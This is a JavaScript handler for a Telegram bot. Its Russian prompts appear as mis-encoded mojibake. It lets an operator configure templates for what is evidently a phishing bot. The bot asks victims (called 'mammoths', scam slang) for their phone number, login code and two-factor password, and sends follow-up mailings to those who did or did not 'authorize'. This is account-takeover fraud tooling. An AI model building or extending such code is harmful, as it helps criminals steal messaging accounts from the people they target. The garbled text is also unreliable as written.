import { bot } from "../../index.js";
import config from '../../../../config.json' assert { type: 'json' };
import states from "../../states.js";
import template from "../../../database/schemas/template.js";
import fs from 'fs/promises';
import path from 'path';
import axios from 'axios';

const reply_markup = {
    inline_keyboard: [
        [
            {
                text: 'üîô –ù–∞–∑–∞–¥',
                callback_data: 'b:templatesb'
            }
        ]
    ]
}

export default {
    name: "template",
    async exec(message, args) {
        if (!message.text) return;
        if (!args[0]) {
            states.set(message.from.id, { action: "template", args: [...args, message.text] })
            return await bot.sendMessage(message.from.id, `*–í–≤–µ–¥–∏—Ç–µ —Å–æ–æ–±—â–µ–Ω–∏–µ –ø–æ—Å–ª–µ /start*`, {
                parse_mode: 'Markdown',
                reply_markup
            })
        }
        if (!args[1]) {
            if (message.photo) {
                try {
                    const photo = message.photo[message.photo.length - 1];
                    const file = await bot.getFile(photo.file_id);

                    const uploadDir = 'uploads';
                    await fs.mkdir(uploadDir, { recursive: true });

                    const fileName = `${Date.now()}_${message.from.id}.jpg`;
                    const relativePath = path.join(uploadDir, fileName);

                    const fileUrl = `https://api.telegram.org/file/bot${config.token}/${file.file_path}`;
                    const response = await axios({
                        method: 'get',
                        url: fileUrl,
                        responseType: 'arraybuffer'
                    });

                    await fs.writeFile(relativePath, response.data);

                    states.set(message.from.id, {
                        action: "template",
                        args: [...args, message.text, relativePath]
                    });
                    args.push(message.text, relativePath);
                } catch (error) {
                    console.error('–û—à–∏–±–∫–∞ –ø—Ä–∏ —Å–æ—Ö—Ä–∞–Ω–µ–Ω–∏–∏ —Ñ–∞–π–ª–∞:', error);
                    states.set(message.from.id, {
                        action: "template",
                        args: [...args, message.text]
                    });
                    args.push(message.text);
                }
            } else {
                states.set(message.from.id, { action: "template", args: [...args, message.text] })
                args.push(message.text)
            }
            return await bot.sendMessage(message.from.id, `*–í–≤–µ–¥–∏—Ç–µ —Å–æ–æ–±—â–µ–Ω–∏–µ –ø–æ—Å–ª–µ –≤–≤–æ–¥–∞ –Ω–æ–º–µ—Ä–∞*

_‚ùî –ü—Ä–∏–º–µ—Ä: –í–≤–µ–¥–∏—Ç–µ k0d_`, {
                parse_mode: 'Markdown',
                reply_markup
            });
        }
        if (!args[2]) {
            states.set(message.from.id, { action: "template", args: [...args, message.text] })
            return await bot.sendMessage(message.from.id, `*–í–≤–µ–¥–∏—Ç–µ —Å–æ–æ–±—â–µ–Ω–∏–µ –ø–æ—Å–ª–µ –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏–∏*`, {
                parse_mode: 'Markdown',
                reply_markup
            });
        }
        if (!args[3]) {
            states.set(message.from.id, { action: "template", args: [...args, message.text] })
            return await bot.sendMessage(message.from.id, `*–í–≤–µ–¥–∏—Ç–µ —Å–æ–æ–±—â–µ–Ω–∏–µ –µ—Å–ª–∏ —É –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è —Å—Ç–æ–∏—Ç –ø–∞—Ä–æ–ª—å*`, {
                parse_mode: 'Markdown',
                reply_markup
            });
        }
        if (!args[4]) {
            states.set(message.from.id, { action: "template", args: [...args, message.text] })
            return await bot.sendMessage(message.from.id, `*–í–≤–µ–¥–∏—Ç–µ —Å–æ–æ–±—â–µ–Ω–∏–µ –µ—Å–ª–∏ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –≤–≤–µ–ª –Ω–µ–≤–µ—Ä–Ω—ã–π –ø–∞—Ä–æ–ª—å*`, {
                parse_mode: 'Markdown',
                reply_markup
            });
        }
        if (!args[5]) {
            states.set(message.from.id, { action: "template", args: [...args, message.text] })
            return await bot.sendMessage(message.from.id, `*–í–≤–µ–¥–∏—Ç–µ —Å–æ–æ–±—â–µ–Ω–∏–µ –µ—Å–ª–∏ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –≤–≤–µ–ª –Ω–µ–≤–µ—Ä–Ω—ã–π k0–¥*`, {
                parse_mode: 'Markdown',
                reply_markup
            });
        }
        if (!args[6]) {
            states.set(message.from.id, { action: "template", args: [...args, message.text] })
            return await bot.sendMessage(message.from.id, `*–í–≤–µ–¥–∏—Ç–µ —Ç–µ–∫—Å—Ç –µ—Å–ª–∏ –º–∞–º–æ–Ω—Ç –≤–≤–æ–¥–∏—Ç –∫–æ–¥ –Ω–µ —Ü–∏—Ñ—Ä–∞–º–∏*`, {
                parse_mode: 'Markdown',
                reply_markup
            });
        }
        if (!args[7]) {
            states.set(message.from.id, { action: "template", args: [...args, message.text] })
            return await bot.sendMessage(message.from.id, `*–í–≤–µ–¥–∏—Ç–µ —Ç–µ–∫—Å—Ç –µ—Å–ª–∏ —é–∑–µ—Ä –ø—Ä–æ—Å—Ä–æ—á–∏–ª –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏—é*`, {
                parse_mode: 'Markdown',
                reply_markup
            });
        }
        if (!args[8]) {
            states.set(message.from.id, { action: "template", args: [...args, message.text] })
            return await bot.sendMessage(message.from.id, `*–í–≤–µ–¥–∏—Ç–µ —Ç–µ–∫—Å—Ç –ø—Ä–∏ –æ—à–∏–±–∫–µ –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏–∏*`, {
                parse_mode: 'Markdown',
                reply_markup
            });
        }
        if (!args[9]) {
            states.set(message.from.id, { action: "template", args: [...args, message.text] })
            return await bot.sendMessage(message.from.id, `*–í–≤–µ–¥–∏—Ç–µ —Ç–µ–∫—Å—Ç –æ–∂–∏–¥–∞–Ω–∏—è –∫–æ–¥–∞*

_‚ùî –ü—Ä–∏–º–µ—Ä: –û–∂–∏–¥–∞–π—Ç–µ..._`, {
                parse_mode: 'Markdown',
                reply_markup
            });
        }
        if (!args[10]) {
            states.set(message.from.id, { action: "template", args: [...args, message.text] })
            const tempId = Date.now().toString();

            bot.addListener('callback_query', query => {
                if (query.data != tempId) return;
                states.set(message.from.id, { action: "template", args: [...args, message.text] })
                message.text = `–ü—Ä–æ–ø—É—Å—Ç–∏—Ç—å`
                bot.emit('message', message);
            })
            return await bot.sendMessage(message.from.id, `*–í–≤–µ–¥–∏—Ç–µ —Ç–µ–∫—Å—Ç —Ä–∞—Å—Å—ã–ª–∫–∏ —á–µ—Ä–µ–∑ 5, 10, 30, 60, 240 –º–∏–Ω—É—Ç –¥–ª—è —Ç–µ—Ö –∫—Ç–æ –∞–≤—Ç–æ—Ä–∏–∑–æ–≤–∞–ª—Å—è. 

üí° –ê–≤—Ç–æ—Ä–∏–∑–æ–≤–∞–ª—Å—è - —Ç–æ—Ç –∫—Ç–æ –ø—Ä–æ—à–µ–ª –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏—é.*`, {
                parse_mode: 'Markdown',
                reply_markup: {
                    inline_keyboard: [
                        [
                            {
                                text: '‚ùå –ü—Ä–æ–ø—É—Å—Ç–∏—Ç—å',
                                callback_data: tempId
                            }
                        ],
                        ...reply_markup.inline_keyboard
                    ]
                }
            });
        }
        if (!args[11]) {
            if (message.raw === '–ü—Ä–æ–ø—É—Å—Ç–∏—Ç—å') {
                states.set(message.from.id, { action: "template", args: [...args, message.raw, message.raw] })
                args.push('–ü—Ä–æ–ø—É—Å—Ç–∏—Ç—å', '–ü—Ä–æ–ø—É—Å—Ç–∏—Ç—å', '–ü—Ä–æ–ø—É—Å—Ç–∏—Ç—å')
            } else {
                states.set(message.from.id, { action: "template", args: [...args, message.text] })
                return await bot.sendMessage(message.from.id, `*–í–≤–µ–¥–∏—Ç–µ —Ç–µ–∫—Å—Ç –∫–Ω–æ–ø–∫–∏ —Ä–∞—Å—Å—ã–ª–∫–∏ —á–µ—Ä–µ–∑ 5, 10, 30, 60, 240 –º–∏–Ω—É—Ç –¥–ª—è —Ç–µ—Ö –∫—Ç–æ –∞–≤—Ç–æ—Ä–∏–∑–æ–≤–∞–ª—Å—è. 

üí° –ê–≤—Ç—Ä–∏–∑–æ–≤–∞–ª—Å—è - —Ç–æ—Ç –∫—Ç–æ –ø—Ä–æ—à–µ–ª –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏—é.*`, {
                    parse_mode: 'Markdown',
                    reply_markup
                });
            }
        }
        if (!args[12]) {
            states.set(message.from.id, { action: "template", args: [...args, message.raw] })
            const START = Date.now().toString();
            const LINK = (+START + 1).toString();

            bot.addListener('callback_query', query => {
                if (query.data != START && query.data != LINK) return;
                states.set(message.from.id, { action: "template", args: [...args, message.raw] })
                message.text = query.data == START ? `–°—Ç–∞—Ä—Ç` : '–°—Å—ã–ª–∫–∞'
                bot.emit('message', message);
            })
            return await bot.sendMessage(message.from.id, `*–í–≤–µ–¥–∏—Ç–µ —Ñ–æ—Ä–º–∞—Ç –∫–Ω–æ–ø–∫–∏  —Ä–∞—Å—Å—ã–ª–∫–∏ —á–µ—Ä–µ–∑ 5, 10, 30, 60, 240 –º–∏–Ω—É—Ç –¥–ª—è —Ç–µ—Ö –∫—Ç–æ –∞–≤—Ç–æ—Ä–∏–∑–æ–≤–∞–ª—Å—è. 

üí°–°—Ç–∞—Ä—Ç - –∑–∞–ø—É—Å–∫–µ—Ç –±–æ—Ç –∑–∞–Ω–æ–≤–æ. –°—Å—ã–ª–∫–∞ - –ø–µ—Ä–µ–Ω–∞–ø—Ä–∞–≤–ª—è–µ—Ç –Ω–∞ –í–∞—à —Ä–µ—Å—É—Ä—Å.*`, {
                parse_mode: 'Markdown',
                reply_markup: {
                    inline_keyboard: [
                        [
                            {
                                text: '–°—Ç—Ä—Ç',
                                callback_data: START
                            },
                            {
                                text: 'C—Å—ã–ª–∫–∞',
                                callback_data: LINK
                            }
                        ],
                        ...reply_markup.inline_keyboard
                    ]
                }
            });
        }
        if (!args[13]) {
            if (message.raw === '–°—Ç–∞—Ä—Ç') {
                states.set(message.from.id, { action: "template", args: [...args] })
                args.push('–°—Ç–∞—Ä—Ç')
            } else if (message.raw === '–°—Å—ã–ª–∫–∞') {
                states.set(message.from.id, { action: "template", args: [...args, message.raw] })
                return await bot.sendMessage(message.from.id, `*–í–≤–µ–¥–∏—Ç–µ —Å—Å—ã–ª–∫—É*`, {
                    parse_mode: 'Markdown',
                    reply_markup
                });
            } else {
                return await bot.sendMessage(message.from.id, `*‚ùå –í—ã–±–µ—Ä–∏—Ç–µ –∫–Ω–æ–ø–∫–∞–º–∏*`, {
                    parse_mode: 'Markdown',
                    reply_markup
                });
            }
        }
        if (!args[14]) {
            states.set(message.from.id, { action: "template", args: [...args, message.text] })
            const tempId = Date.now().toString();

            bot.addListener('callback_query', query => {
                if (query.data != tempId) return;
                states.set(message.from.id, { action: "template", args: [...args, message.text] })
                message.text = `–ü—Ä–æ–ø—É—Å—Ç–∏—Ç—å`
                bot.emit('message', message);
            })
            return await bot.sendMessage(message.from.id, `*–í–≤–µ–¥–∏—Ç–µ —Ç–µ–∫—Å—Ç —Ä–∞—Å—Å—ã–ª–∫–∏ —á–µ—Ä–µ–∑ 5, 10, 30, 60, 240 –º–∏–Ω—É—Ç –¥–ª—è —Ç–µ—Ö –∫—Ç–æ –Ω–µ –∞–≤—Ç–æ—Ä–∏–∑–æ–≤–∞–ª—Å—è. 

üí° –ù–µ–≤—Ç–æ—Ä–∏–∑–æ–≤–∞–ª—Å—è - —Ç–æ—Ç –∫—Ç–æ –Ω–µ –ø—Ä–æ—à–µ–ª –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏—é.*`, {
                parse_mode: 'Markdown',
                reply_markup: {
                    inline_keyboard: [
                        [
                            {
                                text: '‚ùå –ü—Ä–æ–ø—É—Å—Ç–∏—Ç—å',
                                callback_data: tempId
                            }
                        ],
                        ...reply_markup.inline_keyboard
                    ]
                }
            });
        }
        if (!args[15]) {
            if (message.raw === '–ü—Ä–æ–ø—É—Å—Ç–∏—Ç—å') {
                states.set(message.from.id, { action: "template", args: [...args, message.raw, message.raw] });
                args.push('–ü—Ä–æ–ø—É—Å—Ç–∏—Ç—å', '–ü—Ä–æ–ø—É—Å—Ç–∏—Ç—å', '–ü—Ä–æ–ø—É—Å—Ç–∏—Ç—å');
            } else {
                states.set(message.from.id, { action: "template", args: [...args, message.text] })
                return await bot.sendMessage(message.from.id, `*–í–≤–µ–¥–∏—Ç–µ —Ç–µ–∫—Å—Ç –∫–Ω–æ–ø–∫–∏ —Ä–∞—Å—Å—ã–ª–∫–∏ —á–µ—Ä–µ–∑ 5, 10, 30, 60, 240 –º–∏–Ω—É—Ç –¥–ª—è —Ç–µ—Ö –∫—Ç–æ –Ω–µ –∞–≤—Ç–æ—Ä–∏–∑–æ–≤–∞–ª—Å—è. 

üí° –ù–µ –∞–≤—Ç–æ—Ä–∏–∑–æ–≤–∞–ª—Å—è - —Ç–æ—Ç –∫—Ç–æ –Ω–µ –ø—Ä–æ—à–µ–ª –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏—é.*`, {
                    parse_mode: 'Markdown',
                    reply_markup
                });
            }
        }
        if (!args[16]) {
            states.set(message.from.id, { action: "template", args: [...args, message.raw] })
            const START = Date.now().toString();
            const LINK = (+START + 1).toString();

            bot.addListener('callback_query', query => {
                if (query.data != START && query.data != LINK) return;
                states.set(message.from.id, { action: "template", args: [...args, message.text] })
                message.text = query.data == START ? `–°—Ç–∞—Ä—Ç` : '–°—Å—ã–ª–∫–∞'
                bot.emit('message', message);
            })
            return await bot.sendMessage(message.from.id, `*–í–≤–µ–¥–∏—Ç–µ —Ñ–æ—Ä–º–∞—Ç –∫–Ω–æ–ø–∫–∏  —Ä–∞—Å—Å—ã–ª–∫–∏ —á–µ—Ä–µ–∑ 5, 10, 30, 60, 240 –º–∏–Ω—É—Ç –¥–ª—è —Ç–µ—Ö –∫—Ç–æ –Ω–µ –∞–≤—Ç–æ—Ä–∏–∑–æ–≤–∞–ª—Å—è. 

üí°–°—Ç–∞—Ä—Ç - –∑–∞–ø—É—Å–∫–µ—Ç –±–æ—Ç –∑–∞–Ω–æ–≤–æ. –°—Å—ã–ª–∫–∞ - –ø–µ—Ä–µ–Ω–∞–ø—Ä–∞–≤–ª—è–µ—Ç –Ω–∞ –í–∞—à —Ä–µ—Å—É—Ä—Å.*`, {
                parse_mode: 'Markdown',
                reply_markup: {
                    inline_keyboard: [
                        [
                            {
                                text: '–°—Ç–∞—Ä—Ç',
                                callback_data: START
                            },
                            {
                                text: 'C—Å—ã–ª–∫–∞',
                                callback_data: LINK
                            }
                        ],
                        ...reply_markup.inline_keyboard
                    ]
                }
            });
        }
        if (!args[17]) {
            if (message.raw === '–°—Ç–∞—Ä—Ç') {
                states.set(message.from.id, { action: "template", args: [...args] })
                args.push(`–°—Ç–∞—Ä—Ç`)
            } else if (message.raw === '–°—Å—ã–ª–∫–∞') {
                states.set(message.from.id, { action: "template", args: [...args, message.raw] })
                return await bot.sendMessage(message.from.id, `*–í–≤–µ–¥–∏—Ç–µ —Å—Å—ã–ª–∫—É*`, {
                    parse_mode: 'Markdown',
                    reply_markup
                });
            } else {
                return await bot.sendMessage(message.from.id, `*‚ùå –í—ã–±–µ—Ä–∏—Ç–µ –∫–Ω–æ–ø–∫–∞–º–∏*`, {
                    parse_mode: 'Markdown',
                    reply_markup
                });
            }
        }
        if (!args[18]) {
            states.set(message.from.id, { action: "template", args: [...args, message.text] })
            return await bot.sendMessage(message.from.id, `*–í–≤–µ–¥–∏—Ç–µ —Ç–µ–∫—Å—Ç –∫–Ω–æ–ø–∫–∏ –¥–ª—è –æ—Ç–ø—Ä–∞–≤–∫–∏ –∫–æ–Ω—Ç–∞–∫—Ç–∞*`, {
                parse_mode: 'Markdown',
                reply_markup
            });
        }
        const [name, start, media_startbot, code, auth, password, wrongPassword, wrongCode, NaNCode, timeout, error, wait, mailing1h, button, type, url, mailing1hUnauth, buttonUnauth, typeUnauth, urlUnauth] = args;
        await new template({
            id: Date.now(),
            owner: message.from.id,
            name,
            start,
            media_startbot,
            code,
            auth,
            password,
            wrongPassword,
            wrongCode,
            NaNCode,
            timeout,
            error,
            wait,
            mailing1h,
            button,
            type,
            url,
            mailing1hUnauth,
            buttonUnauth,
            typeUnauth,
            urlUnauth,
            contact: message.raw
        }).save();
        console.log([name, start, media_startbot, code, auth, password, wrongPassword, wrongCode, NaNCode, timeout, error, wait, mailing1h, button, type, url, mailing1hUnauth, buttonUnauth, typeUnauth, urlUnauth])

        states.delete(message.from.id);
        return await bot.sendMessage(message.from.id, `*‚úÖ –®–∞–±–ª–æ–Ω —É—Å–ø–µ—à–Ω–æ —Å–æ–∑–¥–∞–Ω!*`, {
            parse_mode: 'Markdown',
            reply_markup
        });
    }
}